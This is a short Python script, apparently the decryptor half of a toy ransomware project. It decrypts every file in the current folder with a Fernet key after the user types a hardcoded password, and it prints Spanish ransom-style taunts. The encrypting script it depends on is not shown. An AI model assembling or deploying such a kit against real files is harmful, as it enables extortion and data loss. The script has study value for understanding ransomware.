import os
from cryptography.fernet import Fernet

#Find all files and add into a list

files = [] #lista

for file in os.listdir():
    if file == "ransome.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)
        
    
print(files)

with open("thekey.key", "rb") as key:
    secretkey = key.read()

palabra_secreta = "Pan"
digita_palabra = input("Digita la palabra secreta para desencriptar tus archivos\n")

if digita_palabra == palabra_secreta:
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
            contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
            print ("Lograste salvar tus archivos, no correras con la misma suerte a la proxima!!!")

else:
    print ("Palabra erronea, cagaste")
        
